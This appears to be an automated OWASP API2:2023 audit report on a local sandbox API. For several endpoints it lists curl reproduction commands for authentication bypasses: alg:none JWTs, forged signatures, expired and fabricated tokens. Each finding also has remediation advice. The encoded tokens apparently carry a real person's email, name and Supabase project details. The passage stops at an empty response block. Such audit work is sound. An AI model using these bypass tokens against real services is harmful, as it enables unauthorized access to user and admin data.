# OWASP API2:2023 — Authentication Misconfiguration Security Audit Report

- **API Target:** Authentication Misconfiguration Sandbox API (v1.0.0)
- **Base URL:** `http://localhost:8004`
- **Scan Timestamp:** 2026-09-24 13:08:12 UTC
- **Standard:** OWASP API Security Top 10 — API2:2023 Broken Authentication
- **Total Probes Executed:** 35
- **Vulnerabilities Identified:** 19

## Executive Summary
CRITICAL FINDING: Authentication controls are misconfigured. One or more endpoints permit unauthenticated access, accept unsigned (alg: none) tokens, ignore expired credentials, or leak verbose server traces.

## Findings Matrix

| Endpoint | Method | Test Vector | Status | Verdict | Severity |
| :--- | :---: | :--- | :---: | :---: | :---: |
| `/api/public/status` | GET | Missing Authentication Header | `200` | PROTECTED | NONE |
| `/api/public/status` | GET | Empty Bearer Token Header | `200` | PROTECTED | NONE |
| `/api/public/status` | GET | Arbitrary / Fabricated Bearer Token | `200` | PROTECTED | NONE |
| `/api/public/status` | GET | JWT alg:none Signature Bypass | `200` | PROTECTED | NONE |
| `/api/public/status` | GET | Tampered Cryptographic Signature | `200` | PROTECTED | NONE |
| `/api/public/status` | GET | Expired Token Validation | `200` | PROTECTED | NONE |
| `/api/public/status` | GET | Malformed Token & Verbose Error Leakage | `200` | PROTECTED | NONE |
| `/api/admin/users` | GET | Missing Authentication Header | `200` | **VULNERABLE** | CRITICAL |
| `/api/admin/users` | GET | Empty Bearer Token Header | `200` | **VULNERABLE** | CRITICAL |
| `/api/admin/users` | GET | Arbitrary / Fabricated Bearer Token | `200` | **VULNERABLE** | CRITICAL |
| `/api/admin/users` | GET | JWT alg:none Signature Bypass | `200` | **VULNERABLE** | CRITICAL |
| `/api/admin/users` | GET | Tampered Cryptographic Signature | `200` | **VULNERABLE** | CRITICAL |
| `/api/admin/users` | GET | Expired Token Validation | `200` | **VULNERABLE** | HIGH |
| `/api/admin/users` | GET | Malformed Token & Verbose Error Leakage | `200` | **VULNERABLE** | MEDIUM |
| `/api/user/profile` | GET | Missing Authentication Header | `401` | PROTECTED | NONE |
| `/api/user/profile` | GET | Empty Bearer Token Header | `401` | PROTECTED | NONE |
| `/api/user/profile` | GET | Arbitrary / Fabricated Bearer Token | `401` | PROTECTED | NONE |
| `/api/user/profile` | GET | JWT alg:none Signature Bypass | `200` | **VULNERABLE** | CRITICAL |
| `/api/user/profile` | GET | Tampered Cryptographic Signature | `200` | **VULNERABLE** | CRITICAL |
| `/api/user/profile` | GET | Expired Token Validation | `200` | **VULNERABLE** | HIGH |
| `/api/user/profile` | GET | Malformed Token & Verbose Error Leakage | `401` | PROTECTED | NONE |
| `/api/user/settings` | GET | Missing Authentication Header | `401` | PROTECTED | NONE |
| `/api/user/settings` | GET | Empty Bearer Token Header | `401` | PROTECTED | NONE |
| `/api/user/settings` | GET | Arbitrary / Fabricated Bearer Token | `401` | PROTECTED | NONE |
| `/api/user/settings` | GET | JWT alg:none Signature Bypass | `200` | **VULNERABLE** | CRITICAL |
| `/api/user/settings` | GET | Tampered Cryptographic Signature | `200` | **VULNERABLE** | CRITICAL |
| `/api/user/settings` | GET | Expired Token Validation | `200` | **VULNERABLE** | HIGH |
| `/api/user/settings` | GET | Malformed Token & Verbose Error Leakage | `401` | PROTECTED | NONE |
| `/api/user/data` | GET | Missing Authentication Header | `401` | PROTECTED | NONE |
| `/api/user/data` | GET | Empty Bearer Token Header | `200` | **VULNERABLE** | CRITICAL |
| `/api/user/data` | GET | Arbitrary / Fabricated Bearer Token | `200` | **VULNERABLE** | CRITICAL |
| `/api/user/data` | GET | JWT alg:none Signature Bypass | `200` | **VULNERABLE** | CRITICAL |
| `/api/user/data` | GET | Tampered Cryptographic Signature | `200` | **VULNERABLE** | CRITICAL |
| `/api/user/data` | GET | Expired Token Validation | `200` | **VULNERABLE** | HIGH |
| `/api/user/data` | GET | Malformed Token & Verbose Error Leakage | `500` | **VULNERABLE** | MEDIUM |

## Detailed Vulnerability Analysis & Proof of Concept

### Finding 1: Missing Authentication Header on `GET /api/admin/users`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-306: Missing Authentication for Critical Function
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Private endpoint accessible without any Authorization header.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/admin/users"
```

**Server Response Preview:**
```json
{"warning":"VULNERABILITY DETECTED: This endpoint returned sensitive admin data without requiring authentication!","total_users":2,"users":[{"id":101,"username":"yuvraj_dev","email":"yuvraj@example...
```

**Remediation Recommendation:**
> Enforce mandatory authentication middleware on all protected API routes. Ensure requests without valid Authorization Bearer tokens immediately terminate with 401 Unauthorized before executing controller or business logic.

### Finding 2: Empty Bearer Token Header on `GET /api/admin/users`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-287: Improper Authentication
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Server accepted empty Bearer token header without verification.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/admin/users" -H "Authorization: Bearer"
```

**Server Response Preview:**
```json
{"warning":"VULNERABILITY DETECTED: This endpoint returned sensitive admin data without requiring authentication!","total_users":2,"users":[{"id":101,"username":"yuvraj_dev","email":"yuvraj@example...
```

**Remediation Recommendation:**
> Enforce mandatory authentication middleware on all protected API routes. Ensure requests without valid Authorization Bearer tokens immediately terminate with 401 Unauthorized before executing controller or business logic.

### Finding 3: Arbitrary / Fabricated Bearer Token on `GET /api/admin/users`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-287: Improper Authentication
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Server accepted arbitrary/fabricated Bearer token.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/admin/users" -H "Authorization: Bearer sentinel_unauthorized_fake_token_9999"
```

**Server Response Preview:**
```json
{"warning":"VULNERABILITY DETECTED: This endpoint returned sensitive admin data without requiring authentication!","total_users":2,"users":[{"id":101,"username":"yuvraj_dev","email":"yuvraj@example...
```

**Remediation Recommendation:**
> Enforce mandatory authentication middleware on all protected API routes. Ensure requests without valid Authorization Bearer tokens immediately terminate with 401 Unauthorized before executing controller or business logic.

### Finding 4: JWT alg:none Signature Bypass on `GET /api/admin/users`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-347: Improper Verification of Cryptographic Signature
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: JWT alg:none Signature Bypass. Server accepted unsigned JWT.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/admin/users" -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1NTQ2MSwgImlhdCI6IDE3OTAyNTE4NjEsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ."
```

**Server Response Preview:**
```json
{"warning":"VULNERABILITY DETECTED: This endpoint returned sensitive admin data without requiring authentication!","total_users":2,"users":[{"id":101,"username":"yuvraj_dev","email":"yuvraj@example...
```

**Remediation Recommendation:**
> Explicitly whitelist cryptographic algorithms in your JWT verification library (e.g. algorithms=['HS256']). Never allow algorithm header negotiation or 'none' algorithm tokens in production.

### Finding 5: Tampered Cryptographic Signature on `GET /api/admin/users`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-347: Improper Verification of Cryptographic Signature
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Missing Signature Verification. Server accepted forged signature.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/admin/users" -H "Authorization: Bearer eyJhbGciOiAiRVMyNTYiLCAia2lkIjogIjNhYmE2OWYwLWJkYzEtNDljMy1iZGNjLWU1YjU2OGE0ZGU1NSIsICJ0eXAiOiAiSldUIn0.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1NTQ2MSwgImlhdCI6IDE3OTAyNTE4NjEsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ.OuWR4LP55kRnNbS4H_0B3ursXdKto1JSF0UM8XXyPQocBBvjv-lIxyLsmDRJoxo6oJECNO7bE2Qme3qtINVALID"
```

**Server Response Preview:**
```json
{"warning":"VULNERABILITY DETECTED: This endpoint returned sensitive admin data without requiring authentication!","total_users":2,"users":[{"id":101,"username":"yuvraj_dev","email":"yuvraj@example...
```

**Remediation Recommendation:**
> Always cryptographically verify the token signature using a strong secret key or public key. Never rely on simply decoding the JWT payload (e.g. jwt.decode(verify=False)).

### Finding 6: Expired Token Validation on `GET /api/admin/users`
- **Severity:** HIGH
- **CWE Classification:** CWE-613: Insufficient Session Expiration
- **HTTP Status Code Returned:** `200`
- **Security Impact:** HIGH: Server accepted expired token without verifying 'exp' claim.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/admin/users" -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1MTY5MiwgImlhdCI6IDE3OTAyNDgwOTIsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ.EXPIRED_SIGNATURE_PROBE"
```

**Server Response Preview:**
```json
{"warning":"VULNERABILITY DETECTED: This endpoint returned sensitive admin data without requiring authentication!","total_users":2,"users":[{"id":101,"username":"yuvraj_dev","email":"yuvraj@example...
```

**Remediation Recommendation:**
> Ensure the JWT verification engine checks the 'exp' (expiration) claim and rejects tokens whose expiration timestamp is in the past. Set short-lived access token lifespans (15-60 minutes).

### Finding 7: Malformed Token & Verbose Error Leakage on `GET /api/admin/users`
- **Severity:** MEDIUM
- **CWE Classification:** CWE-209: Generation of Error Message Containing Sensitive Information
- **HTTP Status Code Returned:** `200`
- **Security Impact:** MEDIUM: Server accepted invalid authorization payload.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/admin/users" -H "Authorization: Bearer not.a.valid.jwt.payload.with.invalid.characters!@#$%"
```

**Server Response Preview:**
```json
{"warning":"VULNERABILITY DETECTED: This endpoint returned sensitive admin data without requiring authentication!","total_users":2,"users":[{"id":101,"username":"yuvraj_dev","email":"yuvraj@example...
```

**Remediation Recommendation:**
> Wrap token parsing in robust try/catch blocks and return uniform 401 Unauthorized JSON responses. Disable debug error pages and stack traces in production environments.

### Finding 8: JWT alg:none Signature Bypass on `GET /api/user/profile`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-347: Improper Verification of Cryptographic Signature
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: JWT alg:none Signature Bypass. Server accepted unsigned JWT.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/profile" -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1NTQ2MSwgImlhdCI6IDE3OTAyNTE4NjEsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ."
```

**Server Response Preview:**
```json
{"message":"VULNERABILITY DETECTED: Accepted JWT with alg: 'none' (unsigned token accepted!)","authenticated_user":{"iss":"https://lbvrdowxiffmoacfuoiy.supabase.co/auth/v1","sub":"7170f08f-ddcb-4ac...
```

**Remediation Recommendation:**
> Explicitly whitelist cryptographic algorithms in your JWT verification library (e.g. algorithms=['HS256']). Never allow algorithm header negotiation or 'none' algorithm tokens in production.

### Finding 9: Tampered Cryptographic Signature on `GET /api/user/profile`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-347: Improper Verification of Cryptographic Signature
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: Missing Signature Verification. Server accepted forged signature.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/profile" -H "Authorization: Bearer eyJhbGciOiAiRVMyNTYiLCAia2lkIjogIjNhYmE2OWYwLWJkYzEtNDljMy1iZGNjLWU1YjU2OGE0ZGU1NSIsICJ0eXAiOiAiSldUIn0.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1NTQ2MSwgImlhdCI6IDE3OTAyNTE4NjEsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ.OuWR4LP55kRnNbS4H_0B3ursXdKto1JSF0UM8XXyPQocBBvjv-lIxyLsmDRJoxo6oJECNO7bE2Qme3qtINVALID"
```

**Server Response Preview:**
```json
{"message":"Profile retrieved successfully","authenticated_user":{"iss":"https://lbvrdowxiffmoacfuoiy.supabase.co/auth/v1","sub":"7170f08f-ddcb-4acd-980a-3028812de348","aud":"authenticated","exp":1...
```

**Remediation Recommendation:**
> Always cryptographically verify the token signature using a strong secret key or public key. Never rely on simply decoding the JWT payload (e.g. jwt.decode(verify=False)).

### Finding 10: Expired Token Validation on `GET /api/user/profile`
- **Severity:** HIGH
- **CWE Classification:** CWE-613: Insufficient Session Expiration
- **HTTP Status Code Returned:** `200`
- **Security Impact:** HIGH: Server accepted expired token without verifying 'exp' claim.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/profile" -H "Authorization: Bearer eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1MTY5MiwgImlhdCI6IDE3OTAyNDgwOTIsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ.EXPIRED_SIGNATURE_PROBE"
```

**Server Response Preview:**
```json
{"message":"Profile retrieved successfully","authenticated_user":{"iss":"https://lbvrdowxiffmoacfuoiy.supabase.co/auth/v1","sub":"7170f08f-ddcb-4acd-980a-3028812de348","aud":"authenticated","exp":1...
```

**Remediation Recommendation:**
> Ensure the JWT verification engine checks the 'exp' (expiration) claim and rejects tokens whose expiration timestamp is in the past. Set short-lived access token lifespans (15-60 minutes).

### Finding 11: JWT alg:none Signature Bypass on `GET /api/user/settings`
- **Severity:** CRITICAL
- **CWE Classification:** CWE-347: Improper Verification of Cryptographic Signature
- **HTTP Status Code Returned:** `200`
- **Security Impact:** CRITICAL: JWT alg:none Signature Bypass. Server accepted unsigned JWT.

**Reproduction Proof-of-Concept:**
```bash
curl -s -X GET "http://localhost:8004/api/user/settings" -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJpc3MiOiAiaHR0cHM6Ly9sYnZyZG93eGlmZm1vYWNmdW9peS5zdXBhYmFzZS5jby9hdXRoL3YxIiwgInN1YiI6ICI3MTcwZjA4Zi1kZGNiLTRhY2QtOTgwYS0zMDI4ODEyZGUzNDgiLCAiYXVkIjogImF1dGhlbnRpY2F0ZWQiLCAiZXhwIjogMTc5MDI1NTQ2MSwgImlhdCI6IDE3OTAyNTE4NjEsICJlbWFpbCI6ICJ5dXZyYWpqc29uaTE3QGdtYWlsLmNvbSIsICJwaG9uZSI6ICIiLCAiYXBwX21ldGFkYXRhIjogeyJwcm92aWRlciI6ICJnb29nbGUiLCAicHJvdmlkZXJzIjogWyJnb29nbGUiXX0sICJ1c2VyX21ldGFkYXRhIjogeyJhdmF0YXJfdXJsIjogImh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FDZzhvY0wyVnlYNnNqZUNEakRxYVMxQWdPeUg0eFdTYUhmWEhlajBwQk9oNmdxN2Zjdkl6cnM9czk2LWMiLCAiZW1haWwiOiAieXV2cmFqanNvbmkxN0BnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAiZnVsbF9uYW1lIjogIll1dnJhaiBTb25pIiwgImlzcyI6ICJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCAibmFtZSI6ICJZdXZyYWogU29uaSIsICJwaG9uZV92ZXJpZmllZCI6IGZhbHNlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS9BQ2c4b2NMMlZ5WDZzamVDRGpEcWFTMUFnT3lINHhXU2FIZlhIZWowcEJPaDZncTdmY3ZJenJzPXM5Ni1jIiwgInByb3ZpZGVyX2lkIjogIjExODEwMjE5MzkxOTYyOTI0NjgxNyIsICJzdWIiOiAiMTE4MTAyMTkzOTE5NjI5MjQ2ODE3In0sICJyb2xlIjogImF1dGhlbnRpY2F0ZWQiLCAiYWFsIjogImFhbDEiLCAiYW1yIjogW3sibWV0aG9kIjogIm9hdXRoIiwgInRpbWVzdGFtcCI6IDE3ODk1NzcyNzh9XSwgInNlc3Npb25faWQiOiAiNzUwNjZmMWYtNmIxZi00MjM2LTk5NDgtZjg5MmRmNzc5ZmIwIiwgImlzX2Fub255bW91cyI6IGZhbHNlfQ."
```

**Server Response Preview:**
```json
